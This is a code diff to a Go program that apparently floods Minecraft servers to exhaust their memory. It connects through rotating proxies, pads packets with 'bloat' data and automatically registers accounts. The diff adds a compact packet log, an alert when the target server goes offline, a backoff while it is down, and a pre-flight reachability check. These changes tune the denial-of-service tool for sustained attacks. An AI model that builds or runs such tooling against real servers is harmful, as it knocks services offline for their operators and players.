@@ -18,7 +18,9 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"errors"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 
@@ -28,11 +30,12 @@ import (
 )
 
 var (
-	activeConns  atomic.Int64
-	bytesSent    atomic.Int64
-	droppedConns atomic.Int64
-	newConns     atomic.Int64
-	proxyCounter atomic.Uint64
+	activeConns      atomic.Int64
+	bytesSent        atomic.Int64
+	droppedConns     atomic.Int64
+	newConns         atomic.Int64
+	proxyCounter     atomic.Uint64
+	offlineDetected  atomic.Bool
 
 	// Mojang credentials for online-mode auth. If empty, encryption is attempted
 	// but Mojang join is skipped — the server will kick with "Failed to verify username!"
@@ -115,6 +118,77 @@ func dbgOK(msg string) {
 
 func dbgErr(label string, err error) {
 	fmt.Printf("%s %s✗%s  %s: %v\n", ts(), cBoldRed, cReset, label, err)
+}
+
+// ---------------------------------------------------------------------------
+// Rolling 5-line log for Play state (avoids console flood from inbound packets)
+// ---------------------------------------------------------------------------
+
+var (
+	playRingBuf [5]string
+	playRingN   int
+	playRingMu  sync.Mutex
+)
+
+func fmtRecvLine(id int, name string, payload []byte) string {
+	preview := ""
+	if len(payload) > 0 {
+		n := 16
+		if len(payload) < n {
+			n = len(payload)
+		}
+		preview = fmt.Sprintf("  %s[% x]%s", cGray, payload[:n], cReset)
+	}
+	return fmt.Sprintf("%s %s← RECV%s  %s0x%02X%s  %-34s %s%6d B%s%s",
+		ts(), cBoldCyan, cReset, cCyan, id, cReset, name, cGray, len(payload), cReset, preview)
+}
+
+func fmtSendLine(id int, name string, pkt []byte) string {
+	return fmt.Sprintf("%s %s→ SEND%s  %s0x%02X%s  %-34s %s%6d B%s",
+		ts(), cBoldGreen, cReset, cGreen, id, cReset, name, cGray, len(pkt), cReset)
+}
+
+func fmtInfoLine(format string, args ...interface{}) string {
+	return fmt.Sprintf("%s         %s%s%s", ts(), cGray, fmt.Sprintf(format, args...), cReset)
+}
+
+// playLog adds a line to the rolling 5-line Play-state display, overwriting
+// the previous entries in place rather than scrolling the terminal.
+func playLog(line string) {
+	playRingMu.Lock()
+	defer playRingMu.Unlock()
+
+	shown := playRingN
+	if shown > 5 {
+		shown = 5
+	}
+	if shown > 0 {
+		fmt.Printf("\033[%dA", shown) // move cursor up
+	}
+
+	if playRingN < 5 {
+		playRingBuf[playRingN] = line
+		playRingN++
+	} else {
+		copy(playRingBuf[:], playRingBuf[1:])
+		playRingBuf[4] = line
+	}
+
+	count := playRingN
+	if count > 5 {
+		count = 5
+	}
+	for i := 0; i < count; i++ {
+		fmt.Printf("\033[2K%s\n", playRingBuf[i])
+	}
+}
+
+func isConnRefused(err error) bool {
+	var opErr *net.OpError
+	if errors.As(err, &opErr) && opErr.Op == "dial" {
+		return strings.Contains(opErr.Err.Error(), "connection refused")
+	}
+	return false
 }
 
 func getDialer() (proxy.Dialer, error) {
@@ -403,6 +477,7 @@ func debugRunConfig(conn net.Conn, compressed bool, start time.Time) {
 
 func debugRunPlay(conn net.Conn, compressed bool, start time.Time) {
 	dbgOK("Play state reached — holding indefinitely (Ctrl-C to stop)")
+	playRingN = 0 // reset rolling display for this session
 	kaCount := 0
 
 	if login {
@@ -415,12 +490,12 @@ func debugRunPlay(conn net.Conn, compressed bool, start time.Time) {
 			cmd1 := fmt.Sprintf("register %s", pass1)
 			pkt1 := buildChatCommand(cmd1, compressed)
 			conn.Write(pkt1)
-			dbgSend(0x04, fmt.Sprintf("/%s", cmd1), pkt1)
+			playLog(fmtSendLine(0x04, fmt.Sprintf("/%s", cmd1), pkt1))
 
 			cmd2 := fmt.Sprintf("register %s %s", pass2, pass1)
 			pkt2 := buildChatCommand(cmd2, compressed)
 			conn.Write(pkt2)
-			dbgSend(0x04, fmt.Sprintf("/%s", cmd2), pkt2)
+			playLog(fmtSendLine(0x04, fmt.Sprintf("/%s", cmd2), pkt2))
 		}()
 	}
 
@@ -431,33 +506,33 @@ func debugRunPlay(conn net.Conn, compressed bool, start time.Time) {
 		if err != nil {
 			// EOF is expected immediately after a Disconnect packet — don't log it.
 			if err.Error() != "EOF" {
-				dbgErr("read (Play)", err)
+				playLog(fmtInfoLine("read error: %v", err))
 			}
 			fmt.Printf("\n%sheld for %s%s\n\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
 			return
 		}
 
-		dbgRecv(id, playSPacketName(id), data)
+		playLog(fmtRecvLine(id, playSPacketName(id), data))
 
 		switch id {
 		case 0x1B, 0x1D: // Disconnect (Play)
-			dbgInfo("reason: %s", fmtJSON(data))
+			playLog(fmtInfoLine("reason: %s", fmtJSON(data)))
 			fmt.Printf("\n%sheld for %s%s\n\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
 			return
 
 		case 0x26: // Keep Alive
 			kaCount++
 			kaID, _ := binary.ReadUvarint(bytes.NewReader(data))
-			dbgInfo("id=%d", kaID)
+			playLog(fmtInfoLine("id=%d", kaID))
 			resp := buildPacket(0x18, data, compressed)
 			conn.Write(resp)
-			dbgSend(0x18, fmt.Sprintf("Keep Alive Response  #%d", kaCount), resp)
+			playLog(fmtSendLine(0x18, fmt.Sprintf("Keep Alive Response  #%d", kaCount), resp))
 
 		case 0x28: // Join Game
-			dbgInfo("play start")
+			playLog(fmtInfoLine("play start"))
 
 		case 0x3C: // Player Position
-			dbgInfo("server position/rotation update")
+			playLog(fmtInfoLine("server position/rotation update"))
 		}
 	}
 }
@@ -1038,12 +1113,22 @@ func worker(target string, port uint16, bloatSize int, dribbleInterval time.Dura
 
 		conn, err := dialer.Dial("tcp", target)
 		if err != nil {
-			if verbose {
-				fmt.Fprintf(os.Stderr, "\ndial: %v\n", err)
-			}
 			droppedConns.Add(1)
-			time.Sleep(500 * time.Millisecond)
+			if isConnRefused(err) {
+				if offlineDetected.CompareAndSwap(false, true) {
+					fmt.Fprintf(os.Stderr, "\n%s[!]%s server went offline (%s) — workers backing off\n", cBoldRed, cReset, target)
+				}
+				time.Sleep(15 * time.Second)
+			} else {
+				if verbose {
+					fmt.Fprintf(os.Stderr, "\ndial: %v\n", err)
+				}
+				time.Sleep(500 * time.Millisecond)
+			}
 			continue
+		}
+		if offlineDetected.CompareAndSwap(true, false) {
+			fmt.Fprintf(os.Stderr, "\n%s[✓]%s server back online (%s)\n", cBoldGreen, cReset, target)
 		}
 
 		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
@@ -1219,6 +1304,22 @@ promotion from Eden → Old Gen, saturating heap and triggering Full GC / OOM.`,
 
 		if bloatSize > 255 {
 			return fmt.Errorf("--bloat-size max is 255 (Minecraft protocol limit)")
+		}
+
+		// Pre-flight: verify the server is actually listening before we commit.
+		{
+			d, err := getDialer()
+			if err == nil {
+				c, err := d.Dial("tcp", target)
+				if err != nil {
+					if isConnRefused(err) {
+						return fmt.Errorf("server is offline — connection refused at %s", target)
+					}
+					fmt.Fprintf(os.Stderr, "warning: pre-flight check failed (%v) — proceeding anyway\n", err)
+				} else {
+					c.Close()
+				}
+			}
 		}
 
 		if debug {
